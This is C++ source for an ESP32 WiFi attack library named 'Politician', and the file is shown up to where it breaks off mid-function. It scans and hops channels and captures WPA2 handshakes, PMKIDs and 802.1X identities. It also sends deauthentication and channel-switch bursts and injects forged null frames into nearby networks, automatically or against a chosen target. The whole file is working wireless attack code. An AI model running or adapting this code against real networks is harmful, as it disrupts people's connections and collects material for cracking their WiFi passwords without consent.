#include "Politician.h"
#include <string.h>
#include <esp_log.h>

namespace politician {

// ─── Static members ───────────────────────────────────────────────────────────
Politician *Politician::_instance = nullptr;

// Default 2.4GHz hopping sequence (channels 1-13)
const uint8_t Politician::HOP_SEQ[]  = {1, 6, 11, 2, 7, 3, 8, 4, 9, 5, 10, 12, 13};
const uint8_t Politician::HOP_COUNT  = sizeof(HOP_SEQ) / sizeof(HOP_SEQ[0]);

// 5GHz channel helper - common channels in most regulatory domains
static const uint8_t CHANNEL_5GHZ_COMMON[] = {
    36, 40, 44, 48,           // Band 1 (5.15-5.25 GHz) - Universally allowed
    149, 153, 157, 161, 165   // Band 4 (5.73-5.85 GHz) - UNII-3, widely allowed
};

// Helper function to check if channel is valid
static bool isValidChannel(uint8_t ch) {
    // 2.4GHz channels (1-14)
    if (ch >= 1 && ch <= 14) return true;
    
    // 5GHz channels - check common channels
    for (uint8_t i = 0; i < sizeof(CHANNEL_5GHZ_COMMON); i++) {
        if (ch == CHANNEL_5GHZ_COMMON[i]) return true;
    }
    
    // Additional 5GHz channels (52-144, DFS bands - use with caution)
    if ((ch >= 52 && ch <= 64) || (ch >= 100 && ch <= 144)) return true;
    
    return false;
}

// ─── Constructor ──────────────────────────────────────────────────────────────
Politician::Politician()
    : _active(false), _channel(1), _rxChannel(1), _hopping(false),
      _lastHopMs(0), _lastRssi(0), _hopIndex(0),
      _m1Locked(false), _m1LockEndMs(0),
      _probeLocked(false), _probeLockEndMs(0),
      _customChannelCount(0),
      _eapolCb(nullptr), _apFoundCb(nullptr), _filterCb(nullptr),
      _logCb(nullptr), _attackResultCb(nullptr), _ignoreCount(0),
      _apCacheCount(0),
      _fishState(FISH_IDLE), _fishStartMs(0), _fishRetry(0),
      _fishSsidLen(0), _fishChannel(1),
      _fishAuthLogged(false), _fishAssocLogged(false),
      _csaSecondBurstSent(false),
      _attackMask(ATTACK_ALL),
      _hasTarget(false), _targetChannel(1),
      _capturedCount(0)
{
    _instance = this;
    memset(&_stats,      0, sizeof(_stats));
    memset(_sessions,    0, sizeof(_sessions));
    memset(_apCache,     0, sizeof(_apCache));
    memset(_captured,    0, sizeof(_captured));
    memset(_targetBssid, 0, sizeof(_targetBssid));
    memset(_fishBssid, 0, sizeof(_fishBssid));
    memset(_fishSsid,  0, sizeof(_fishSsid));
    memset(_ownStaMac, 0, sizeof(_ownStaMac));
    memset(_ignoreList, 0, sizeof(_ignoreList));
}

// ─── Logging ─────────────────────────────────────────────────────────────────
void Politician::_log(const char *fmt, ...) {
    char buf[256];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);

    if (_logCb) {
        _logCb(buf);
    } else {
        Serial.print(buf);
    }
}

// ─── begin() ─────────────────────────────────────────────────────────────────
Error Politician::begin(const Config &cfg) {
    _cfg = cfg;
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&wifi_cfg) != ESP_OK) return ERR_WIFI_INIT;
    if (esp_wifi_set_storage(WIFI_STORAGE_RAM) != ESP_OK) return ERR_WIFI_INIT;

    if (esp_wifi_set_mode(WIFI_MODE_APSTA) != ESP_OK) return ERR_WIFI_INIT;

    wifi_config_t ap_cfg = {};
    const char *ap_ssid = "WiFighter";
    memcpy(ap_cfg.ap.ssid, ap_ssid, strlen(ap_ssid));
    ap_cfg.ap.ssid_len        = (uint8_t)strlen(ap_ssid);
    ap_cfg.ap.ssid_hidden     = 1;
    ap_cfg.ap.max_connection  = 4;
    ap_cfg.ap.authmode        = WIFI_AUTH_OPEN;
    ap_cfg.ap.channel         = 1;
    ap_cfg.ap.beacon_interval = 1000;
    if (esp_wifi_set_config(WIFI_IF_AP, &ap_cfg) != ESP_OK) return ERR_WIFI_INIT;

    if (esp_wifi_start() != ESP_OK) return ERR_WIFI_INIT;

    esp_wifi_get_mac(WIFI_IF_STA, _ownStaMac);
    _log("[WiFi] STA MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
        _ownStaMac[0], _ownStaMac[1], _ownStaMac[2],
        _ownStaMac[3], _ownStaMac[4], _ownStaMac[5]);

    esp_log_level_set("wifi", ESP_LOG_NONE);

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    if (esp_wifi_set_promiscuous_filter(&filt) != ESP_OK) return ERR_WIFI_INIT;
    if (esp_wifi_set_promiscuous(true) != ESP_OK) return ERR_WIFI_INIT;
    if (esp_wifi_set_promiscuous_rx_cb(&_promiscuousCb) != ESP_OK) return ERR_WIFI_INIT;
    if (esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) return ERR_WIFI_INIT;

    _initialized = true;
    _log("[WiFi] Ready — monitor mode ch%d\n", _channel);
    return OK;
}

// ─── Active gate ──────────────────────────────────────────────────────────────
void Politician::setActive(bool active) {
    if (!_initialized) return;
    _active = active;
    _log("[WiFi] Capture %s\n", active ? "ACTIVE" : "IDLE");
}

// ─── Channel control ──────────────────────────────────────────────────────────
Error Politician::setChannel(uint8_t ch) {
    if (!_initialized) return ERR_NOT_ACTIVE;
    if (!isValidChannel(ch)) return ERR_INVALID_CH;
    _channel = ch;
    esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
    return OK;
}

Error Politician::lockChannel(uint8_t ch) {
    _hopping = false;
    return setChannel(ch);
}

void Politician::setIgnoreList(const uint8_t (*bssids)[6], uint8_t count) {
    _ignoreCount = (count > MAX_IGNORE) ? MAX_IGNORE : count;
    for (uint8_t i = 0; i < _ignoreCount; i++) {
        memcpy(_ignoreList[i], bssids[i], 6);
    }
    _log("[WiFi] Ignore list updated: %d BSSIDs\n", _ignoreCount);
}

void Politician::clearCapturedList() {
    for (int i = 0; i < MAX_CAPTURED; i++) {
        _captured[i].active = false;
    }
    _capturedCount = 0;
    _log("[WiFi] Captured list cleared\n");
}

void Politician::markCaptured(const uint8_t *bssid) {
    if (_isCaptured(bssid)) return;
    int slot = _capturedCount % MAX_CAPTURED;
    _captured[slot].active = true;
    memcpy(_captured[slot].bssid, bssid, 6);
    _capturedCount++;
    _log("[Cap] Marked %02X:%02X:%02X:%02X:%02X:%02X — won't re-capture\n",
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
}

void Politician::startHopping(uint16_t dwellMs) {
    if (!_initialized) return;
    _hopping    = true;
    _active     = true;
    _hopIndex   = 0;
    _lastHopMs  = millis();
    if (dwellMs > 0) _cfg.hop_dwell_ms = dwellMs;
    _log("[WiFi] Hopping started dwell=%dms\n", _cfg.hop_dwell_ms);
}

void Politician::stopHopping() {
    _hopping = false;
}

// ─── Attack mask ──────────────────────────────────────────────────────────────
void Politician::setAttackMask(uint8_t mask) {
    _attackMask = mask;
    _log("[WiFi] Attack mask: PMKID=%d CSA=%d PASSIVE=%d\n",
        !!(mask & ATTACK_PMKID), !!(mask & ATTACK_CSA), !!(mask & ATTACK_PASSIVE));
}

// ─── Target mode ──────────────────────────────────────────────────────────────
Error Politician::setTarget(const uint8_t *bssid, uint8_t channel) {
    if (!_initialized) return ERR_NOT_ACTIVE;
    if (_isCaptured(bssid)) return ERR_ALREADY_CAPTURED;

    memcpy(_targetBssid, bssid, 6);
    _targetChannel = channel;
    _hasTarget     = true;

    for (int i = 0; i < MAX_AP_CACHE; i++) {
        if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
            _apCache[i].last_probe_ms = 0;
            break;
        }
    }

    _hopping = false;
    _active  = true;
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    _channel   = channel;
    _rxChannel = channel;
    _log("[WiFi] Target → %02X:%02X:%02X:%02X:%02X:%02X ch%d\n",
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], channel);
    
    return OK;
}

void Politician::clearTarget() {
    _hasTarget = false;
    memset(_targetBssid, 0, 6);
    _log("[WiFi] Target cleared — wardriving mode\n");
}

void Politician::setChannelList(const uint8_t *channels, uint8_t count) {
    if (count == 0 || channels == nullptr) {
        _customChannelCount = 0;
        _hopIndex = 0;
        _log("[WiFi] Channel list cleared — hopping all channels\n");
        return;
    }
    _customChannelCount = 0;
    for (uint8_t i = 0; i < count && i < POLITICIAN_MAX_CHANNELS; i++) {
        if (isValidChannel(channels[i])) {
            _customChannels[_customChannelCount++] = channels[i];
        }
    }
    _hopIndex = 0;
    _log("[WiFi] Channel list set: %d channels\n", _customChannelCount);
}

// ─── tick() ───────────────────────────────────────────────────────────────────
void Politician::tick() {
    _processFishing();

    static uint32_t lastDiagMs = 0;
    uint32_t nowDiag = millis();
    if (nowDiag - lastDiagMs >= 30000) {
        lastDiagMs = nowDiag;
        _log("[Stats] total=%lu mgmt=%lu data=%lu eapol=%lu pmkid=%lu caps=%lu aps=%d lock=%s\n",
            (unsigned long)_stats.total, (unsigned long)_stats.mgmt,
            (unsigned long)_stats.data,  (unsigned long)_stats.eapol,
            (unsigned long)_stats.pmkid_found, (unsigned long)_stats.captures,
            _apCacheCount,
            _probeLocked ? "probe" : _m1Locked ? "m1" : "none");
    }

    if (!_hopping) return;
    uint32_t now = millis();

    if (_probeLocked && _fishState == FISH_IDLE && now >= _probeLockEndMs) {
        _probeLocked = false;
        _lastHopMs   = now;
    }

    if (_m1Locked && now >= _m1LockEndMs) {
        _m1Locked  = false;
        _lastHopMs = now;
    }

    bool locked = _m1Locked || _probeLocked || _hasTarget;
    if (!locked && (now - _lastHopMs >= _cfg.hop_dwell_ms)) {
        const uint8_t *seq   = (_customChannelCount > 0) ? _customChannels : HOP_SEQ;
        uint8_t        count = (_customChannelCount > 0) ? _customChannelCount : HOP_COUNT;
        _hopIndex  = (_hopIndex + 1) % count;
        _channel   = seq[_hopIndex];
        esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
        _lastHopMs = now;
        _expireSessions(_cfg.session_timeout_ms);
    }
}

// ─── Static promiscuous callback (IRAM) ──────────────────────────────────────
void IRAM_ATTR Politician::_promiscuousCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (_instance) {
        _instance->_handleFrame((const wifi_promiscuous_pkt_t *)buf, type);
    }
}

void Politician::_handleFrame(const wifi_promiscuous_pkt_t *pkt, wifi_promiscuous_pkt_type_t type) {
    if (!_active) return;
    if (!pkt) return;
    uint16_t sig_len = pkt->rx_ctrl.sig_len;
    if (sig_len < sizeof(ieee80211_hdr_t)) return;

    _stats.total++;
    _lastRssi  = (int8_t)pkt->rx_ctrl.rssi;
    _rxChannel = pkt->rx_ctrl.channel;

    const ieee80211_hdr_t *hdr = (const ieee80211_hdr_t *)pkt->payload;
    uint16_t fc    = hdr->frame_ctrl;
    uint16_t ftype = fc & FC_TYPE_MASK;
    uint8_t  fsub  = fc & FC_SUBTYPE_MASK;

    // --- Packet Logging Filter Hook ---
    if (_packetCb && _cfg.capture_filter != 0) {
        bool log_it = false;
        if (ftype == FC_TYPE_MGMT) {
            if (fsub == MGMT_SUB_BEACON && (_cfg.capture_filter & LOG_FILTER_BEACONS)) log_it = true;
            else if ((fsub == MGMT_SUB_PROBE_REQ || fsub == MGMT_SUB_PROBE_RESP) && (_cfg.capture_filter & LOG_FILTER_PROBES)) log_it = true;
        } else if (ftype == FC_TYPE_DATA && (_cfg.capture_filter & LOG_FILTER_HANDSHAKES)) {
            uint16_t hdr_len = sizeof(ieee80211_hdr_t);
            uint8_t subtype = fsub >> 4;
            bool is_qos = (subtype >= 8 && subtype <= 11);
            if (is_qos) {
                hdr_len += 2;
                if (fc & FC_ORDER_MASK) hdr_len += 4;
            }
            if (sig_len >= hdr_len + EAPOL_MIN_FRAME_LEN) {
                const uint8_t *llc = pkt->payload + hdr_len;
                if (llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 &&
                    llc[6] == EAPOL_ETHERTYPE_HI && llc[7] == EAPOL_ETHERTYPE_LO) {
                    log_it = true;
                }
            }
        }
        if (log_it) _packetCb(pkt->payload, sig_len, _lastRssi, pkt->rx_ctrl.timestamp);
    }
    // ----------------------------------

    if (type == WIFI_PKT_MGMT && ftype == FC_TYPE_MGMT) {
        _stats.mgmt++;
        uint16_t payload_off = sizeof(ieee80211_hdr_t);
        if (sig_len > payload_off) {
            _handleMgmt(hdr, pkt->payload + payload_off, sig_len - payload_off, _lastRssi);
        }
    } else if (type == WIFI_PKT_DATA && ftype == FC_TYPE_DATA) {
        _stats.data++;
        uint8_t  subtype    = (fc & FC_SUBTYPE_MASK) >> 4;
        uint16_t hdr_len    = sizeof(ieee80211_hdr_t);
        bool     is_qos     = (subtype >= 8 && subtype <= 11);
        if (is_qos) {
            hdr_len += 2;
            if (fc & FC_ORDER_MASK) hdr_len += 4;
        }
        if (sig_len > hdr_len) {
            _handleData(hdr, pkt->payload + hdr_len, sig_len - hdr_len, _lastRssi);
        }
    } else {
        _stats.ctrl++;
    }
}

void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                              uint16_t len, int8_t rssi) {
    uint8_t subtype = (hdr->frame_ctrl & FC_SUBTYPE_MASK);

    // Parse both Beacons and Probe Responses. 
    // Sniffing Probe Responses automatically enables Active Decloaking 
    // of Hidden Networks when clients reconnect following a CSA/Deauth attack.
    if (subtype == MGMT_SUB_BEACON || subtype == MGMT_SUB_PROBE_RESP) {
        _stats.beacons++;
        if (len < 12) return;

        const uint8_t *ie     = payload + 12;
        uint16_t       ie_len = (len > 12) ? len - 12 : 0;

        uint8_t beacon_ch = _rxChannel;
        {
            uint16_t pos = 0;
            while (pos + 2 <= ie_len) {
                uint8_t tag  = ie[pos];
                uint8_t tlen = ie[pos + 1];
                if (pos + 2 + tlen > ie_len) break;
                if (tag == 3 && tlen == 1) { beacon_ch = ie[pos + 2]; break; }
                pos += 2 + tlen;
            }
        }

        ApRecord ap;
        memcpy(ap.bssid, hdr->addr3, 6);
        ap.channel = beacon_ch;
        ap.rssi    = rssi;
        _parseSsid(ie, ie_len, ap.ssid, ap.ssid_len);
        ap.enc     = _classifyEnc(ie, ie_len);
        if (ap.enc == 0 && (hdr->frame_ctrl & 0x4000)) ap.enc = 1; // WEP Privacy bit

        // Execute targeting filter
        if (_filterCb && !_filterCb(ap)) return;

        bool is_wpa3_only = (ap.enc >= 3) && _detectWpa3Only(ie, ie_len);
        _cacheAp(ap.bssid, ap.ssid, ap.ssid_len, ap.enc, beacon_ch, is_wpa3_only);
        if (_apFoundCb) _apFoundCb(ap);

        if (ap.ssid_len > 0 && beacon_ch > 0) {
            if (_hasTarget && memcmp(_targetBssid, ap.bssid, 6) != 0) return;

            // --- CLIENT WAKE-UP STIMULATION ---
            if (((hdr->frame_ctrl & FC_SUBTYPE_MASK) == MGMT_SUB_BEACON) && (_attackMask & ATTACK_STIMULATE)) {
                for (int i = 0; i < MAX_AP_CACHE; i++) {
                    if (_apCache[i].active && memcmp(_apCache[i].bssid, ap.bssid, 6) == 0) {
                        if (!_apCache[i].has_active_clients && (millis() - _apCache[i].last_stimulate_ms > 15000)) {
                            _apCache[i].last_stimulate_ms = millis();
                            
                            // Hardware-Level Null Data Injection (FromDS=1, MoreData=1)
                            // Triggered exactly on the microsecond the sleeping client's radio turns on
                            uint8_t wake_null[24] = {
                                0x48, 0x22, 0x00, 0x00, // FC: Null Function, ToDS=0, FromDS=1, MoreData=1
                                0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // DA: Broadcast
                                ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], // BSSID
                                ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], // SA
                                0x00, 0x00 // Sequence
                            };
                            esp_wifi_80211_tx(WIFI_IF_STA, wake_null, sizeof(wake_null), false);
                            _log("[Stimulate] Beacon-Sync Null Injection fired at %02X:%02X:%02X:%02X:%02X:%02X\n",
                                ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5]);
                        }
                        break;
                    }
                }
            }
            // ----------------------------------
        }

        bool canFish = ap.enc >= 3 && ap.ssid_len > 0 && !_isCaptured(ap.bssid);
        if (_hasTarget) canFish = canFish && memcmp(ap.bssid, _targetBssid, 6) == 0;

        if (canFish && _fishState == FISH_IDLE) {
            if (_attackMask & ATTACK_PMKID) {
                for (int i = 0; i < MAX_AP_CACHE; i++) {
                    if (!_apCache[i].active) continue;
                    if (memcmp(_apCache[i].bssid, ap.bssid, 6) != 0) continue;
                    
                    if (_cfg.skip_immune_networks && _apCache[i].is_wpa3_only) {
                        break; // Skip attack for invincible network
                    }

                    uint32_t throttle_ms = _hasTarget ? 0u
                        : _apCache[i].has_active_clients ? 15000u
                        : (uint32_t)_cfg.probe_aggr_interval_s * 1000u;
                    uint32_t elapsed = millis() - _apCache[i].last_probe_ms;
                    if (elapsed >= throttle_ms) {
                        _apCache[i].last_probe_ms = millis();
                        _startFishing(ap.bssid, ap.ssid, ap.ssid_len, beacon_ch);
                    }
                    break;
                }
            } else if (_attackMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
                _fishState = FISH_CSA_WAIT;
                _csaSecondBurstSent = false;
                if (_attackMask & ATTACK_CSA) _sendCsaBurst();
                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count);
                memcpy(_fishBssid, ap.bssid, 6); memcpy(_fishSsid, ap.ssid, ap.ssid_len); _fishSsid[ap.ssid_len] = '\0';
                _fishSsidLen = ap.ssid_len; _fishChannel = beacon_ch; _fishStartMs = millis();
                _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
                _log("[Attack] Starting CSA/Deauth on %02X:%02X:%02X:%02X:%02X:%02X SSID=%.*s ch%d\n",
                    ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], ap.ssid_len, ap.ssid, beacon_ch);
            }
        }

    } else if (subtype == MGMT_SUB_ASSOC_REQ) {
        // Client is associating — mark AP as having active clients immediately
        for (int i = 0; i < MAX_AP_CACHE; i++) {
            if (_apCache[i].active && memcmp(_apCache[i].bssid, hdr->addr1, 6) == 0) {
                _apCache[i].has_active_clients = true;
                break;
            }
        }
    } else if (subtype == 0xB0) {
        if (len >= 6 && !_fishAuthLogged) {
            uint16_t auth_seq = ((uint16_t)payload[2]) | ((uint16_t)payload[3] << 8);
            uint16_t status   = ((uint16_t)payload[4]) | ((uint16_t)payload[5] << 8);
            if (auth_seq == 2) {
                _fishAuthLogged = true;
                _log("[AuthResp] from %02X:%02X:%02X:%02X:%02X:%02X status=%d\n",
                    hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                    hdr->addr2[3], hdr->addr2[4], hdr->addr2[5], status);
            }
        }
    } else if (subtype == MGMT_SUB_ASSOC_RESP) {
        if (len < 6 || !_eapolCb) return;
        const uint8_t *ie     = payload + 6;
        uint16_t       ie_len = (len > 6) ? len - 6 : 0;
        const uint8_t *bssid  = hdr->addr2;
        const uint8_t *sta    = hdr->addr1;

        uint16_t status = ((uint16_t)payload[2]) | ((uint16_t)payload[3] << 8);
        if (!_fishAssocLogged) {
            _fishAssocLogged = true;
            _log("[AssocResp] from %02X:%02X:%02X:%02X:%02X:%02X status=%d\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], status);
        }
        if (status != 0) return;

        uint16_t pos = 0;
        while (pos + 2 <= ie_len) {
            uint8_t tag = ie[pos];
            uint8_t tlen = ie[pos + 1];
            if (pos + 2 + tlen > ie_len) break;
            if (tag == 48 && tlen >= 20) {
                const uint8_t *rsn = ie + pos + 2;
                uint16_t rlen = tlen;
                uint16_t off = 2; off += 4;
                uint16_t pw_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
                off += 2 + pw_cnt * 4;
                uint16_t akm_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
                off += 2 + akm_cnt * 4;
                off += 2;
                uint16_t pmkid_cnt = ((uint16_t)rsn[off]) | ((uint16_t)rsn[off+1] << 8);
                off += 2;
                if (pmkid_cnt > 0 && off + 16 <= rlen) {
                    _stats.pmkid_found++; _stats.captures++;
                    HandshakeRecord rec; memset(&rec, 0, sizeof(rec));
                    rec.type = CAP_PMKID; rec.channel = _rxChannel; rec.rssi = rssi;
                    memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6);
                    _lookupSsid(bssid, rec.ssid, rec.ssid_len);
                    _lookupEnc(bssid, rec.enc);
                    memcpy(rec.pmkid, rsn + off, 16);
                    _log("[PMKID] AssocResp BSSID=%02X:%02X:%02X:%02X:%02X:%02X\n",
                        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                    _markCaptured(bssid); _markCapturedSsidGroup(rec.ssid, rec.ssid_len);
                    if (_eapolCb) _eapolCb(rec);
                }
            }
            pos += 2 + tlen;
        }
    }
}

void Politician::_handleData(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                              uint16_t len, int8_t rssi) {
    if (len < EAPOL_MIN_FRAME_LEN) return;
    if (payload[0] != 0xAA || payload[1] != 0xAA || payload[2] != 0x03) return;
    if (payload[3] != 0x00 || payload[4] != 0x00 || payload[5] != 0x00) return;
    if (payload[6] != EAPOL_ETHERTYPE_HI || payload[7] != EAPOL_ETHERTYPE_LO) return;

    _stats.eapol++;

    bool toDS   = (hdr->frame_ctrl & FC_TODS_MASK)   != 0;
    bool fromDS = (hdr->frame_ctrl & FC_FROMDS_MASK)  != 0;

    const uint8_t *bssid;
    const uint8_t *sta;

    if (toDS && !fromDS) {
        bssid = hdr->addr1; sta = hdr->addr2;
    } else if (!toDS && fromDS) {
        bssid = hdr->addr2; sta = hdr->addr1;
    } else {
        bssid = hdr->addr3; sta = hdr->addr2;
    }

    const uint8_t *eapol = payload + EAPOL_LLC_SIZE;
    uint16_t eapol_len = len - EAPOL_LLC_SIZE;

    if (eapol_len >= 4) {
        if (eapol[1] == 0x00 && _identityCb != nullptr) {
            // Decoupled 802.1X Enterprise Identity Interception
            _parseEapIdentity(bssid, sta, eapol, eapol_len, rssi);
        } else if (eapol[1] == 0x03) {
            // Standard WPA2/WPA3 EAPOL-Key Handshake Layer
            _parseEapol(bssid, sta, eapol, eapol_len, rssi);
        }
    }
}

bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
                              const uint8_t *eapol, uint16_t len, int8_t rssi) {
    if (_isCaptured(bssid)) return false;
    if (len < 4 || eapol[1] != 0x03) return false;

    const uint8_t *key = eapol + 4;
    uint16_t key_len   = len - 4;
    if (key_len < EAPOL_KEY_DATA_LEN + 2) return false;
    if (key[EAPOL_KEY_DESC_TYPE] != 0x02) return false; // Must be RSN/WPA2 descriptor

    uint16_t key_info = ((uint16_t)key[EAPOL_KEY_INFO] << 8) | key[EAPOL_KEY_INFO + 1];
    bool is_pairwise = (key_info & KEYINFO_PAIRWISE) != 0;
    if (!is_pairwise) return false;

    uint8_t msg = 0;
    if ( (key_info & KEYINFO_ACK) && !(key_info & KEYINFO_MIC) && !(key_info & KEYINFO_INSTALL)) msg = 1;
    else if (!(key_info & KEYINFO_ACK) && (key_info & KEYINFO_MIC) && !(key_info & KEYINFO_INSTALL) && !(key_info & KEYINFO_SECURE)) msg = 2;
    else if ((key_info & KEYINFO_ACK) && (key_info & KEYINFO_MIC) && (key_info & KEYINFO_INSTALL)) msg = 3;
    else if (!(key_info & KEYINFO_ACK) && (key_info & KEYINFO_MIC) && !(key_info & KEYINFO_INSTALL) && (key_info & KEYINFO_SECURE)) msg = 4;

    if (msg == 0) return false;

    _log("[EAPOL] M%d from %02X:%02X:%02X:%02X:%02X:%02X ch=%d rssi=%d\n",
        msg, bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], _rxChannel, rssi);

    if (msg == 3 || msg == 4) {
        for (int i = 0; i < MAX_AP_CACHE; i++) {
            if (_apCache[i].active && memcmp(_apCache[i].bssid, bssid, 6) == 0) {
                if (!_apCache[i].has_active_clients) {
                    _apCache[i].has_active_clients = true;
                    _log("[Hot] Active client on %02X:%02X:%02X:%02X:%02X:%02X SSID=%s\n",
                        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], _apCache[i].ssid);
                }
                break;
            }
        }
        return true;
    }

    Session *sess = _findSession(bssid, sta);
    if (!sess) sess = _createSession(bssid, sta);
    if (!sess) return false;

    sess->channel = _rxChannel; sess->rssi = rssi;

    if (msg == 1) {
        bool isOurFishM1 = (_fishState != FISH_IDLE) && memcmp(bssid, _fishBssid, 6) == 0;
        if (!isOurFishM1 && !(_attackMask & ATTACK_PASSIVE)) return false;

        if (key_len < EAPOL_KEY_NONCE + 32) return false;
        memcpy(sess->anonce, key + EAPOL_KEY_NONCE, 32);
        memcpy(sess->m1_replay_counter, key + EAPOL_REPLAY_COUNTER, 8);
        sess->has_m1 = true;

        if (_hopping && !_m1Locked) {
            _probeLocked = false; _m1Locked = true;
            _m1LockEndMs = millis() + _cfg.m1_lock_ms;
        }
        if (_m1Locked && memcmp(sta, _ownStaMac, 6) != 0) _m1LockEndMs = millis() + _cfg.m1_lock_ms;

        uint16_t kdata_len = ((uint16_t)key[EAPOL_KEY_DATA_LEN] << 8) | key[EAPOL_KEY_DATA_LEN + 1];
        if (kdata_len >= 18 && key_len >= EAPOL_KEY_DATA + kdata_len) {
            const uint8_t *kdata = key + EAPOL_KEY_DATA;
            for (uint16_t i = 0; i + 22 <= kdata_len; i++) {
                if (kdata[i] == 0xDD && kdata[i+2] == 0x00 && kdata[i+3] == 0x0F && kdata[i+4] == 0xAC && kdata[i+5] == 0x04) {
                    _stats.pmkid_found++; _stats.captures++;
                    HandshakeRecord rec; memset(&rec, 0, sizeof(rec));
                    rec.type = CAP_PMKID; rec.channel = _rxChannel; rec.rssi = rssi;
                    memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6);
                    memcpy(rec.ssid, sess->ssid, sizeof(sess->ssid)); rec.ssid_len = sess->ssid_len;
                    _lookupEnc(bssid, rec.enc);
                    memcpy(rec.pmkid, kdata + i + 6, 16);
                    _log("[PMKID] Found for %02X:%02X:%02X:%02X:%02X:%02X\n",
                        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
                    _markCaptured(bssid); _markCapturedSsidGroup(sess->ssid, sess->ssid_len);
                    if (_eapolCb) _eapolCb(rec);
                    break;
                }
            }
        }
    } else if (msg == 2) {
        if (memcmp(sta, _ownStaMac, 6) == 0) return false;
        if (key_len < EAPOL_KEY_MIC + 16) return false;
        if (sess->has_m1 && memcmp(key + EAPOL_REPLAY_COUNTER, sess->m1_replay_counter, 8) != 0) return false;
        memcpy(sess->mic, key + EAPOL_KEY_MIC, 16);
        uint16_t store_len = (len < 256) ? len : 256;
        memcpy(sess->eapol_m2, eapol, store_len); sess->eapol_m2_len = store_len;
        if (store_len >= 4 + EAPOL_KEY_MIC + 16) memset(sess->eapol_m2 + 4 + EAPOL_KEY_MIC, 0, 16);
        
        bool is_new_m2 = !sess->has_m2;
        sess->has_m2 = true;

        if (sess->has_m1) {
            HandshakeRecord rec; memset(&rec, 0, sizeof(rec));
            rec.type = (_fishState == FISH_CSA_WAIT) ? CAP_EAPOL_CSA : CAP_EAPOL;
            rec.channel = sess->channel; rec.rssi = sess->rssi;
            memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6); memcpy(rec.ssid, sess->ssid, 33);
            rec.ssid_len = sess->ssid_len; _lookupEnc(bssid, rec.enc); memcpy(rec.anonce, sess->anonce, 32);
            memcpy(rec.mic, sess->mic, 16); memcpy(rec.eapol_m2, sess->eapol_m2, sess->eapol_m2_len);
            rec.eapol_m2_len = sess->eapol_m2_len; rec.has_anonce = true; rec.has_mic = true;
            _log("[EAPOL] Complete M1+M2 for %02X:%02X:%02X:%02X:%02X:%02X SSID=%s\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], sess->ssid);
            _stats.captures++; _m1Locked = false;
            _markCaptured(bssid); _markCapturedSsidGroup(sess->ssid, sess->ssid_len);
            if (_eapolCb) _eapolCb(rec);
            sess->active = false;
        } else if (is_new_m2 && _cfg.capture_half_handshakes) {
            // M2 seen without a prior M1 — fire half-handshake callback then pivot to active attack
            HandshakeRecord rec; memset(&rec, 0, sizeof(rec));
            rec.type = CAP_EAPOL_HALF;
            rec.channel = sess->channel; rec.rssi = sess->rssi;
            memcpy(rec.bssid, bssid, 6); memcpy(rec.sta, sta, 6); memcpy(rec.ssid, sess->ssid, 33);
            rec.ssid_len = sess->ssid_len; _lookupEnc(bssid, rec.enc);
            memcpy(rec.mic, sess->mic, 16); memcpy(rec.eapol_m2, sess->eapol_m2, sess->eapol_m2_len);
            rec.eapol_m2_len = sess->eapol_m2_len; rec.has_mic = true;
            _log("[EAPOL] Half-handshake (M2-only) for %02X:%02X:%02X:%02X:%02X:%02X SSID=%s — pivoting\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], sess->ssid);
            if (_eapolCb) _eapolCb(rec);

            // Pivot to active attack to collect a complete handshake
            if (_fishState == FISH_IDLE) {
                if (_attackMask & ATTACK_PMKID) {
                    _startFishing(bssid, sess->ssid, sess->ssid_len, sess->channel);
                } else if (_attackMask & (ATTACK_CSA | ATTACK_DEAUTH)) {
                    memcpy(_fishBssid, bssid, 6);
                    memcpy(_fishSsid, sess->ssid, sess->ssid_len); _fishSsid[sess->ssid_len] = '\0';
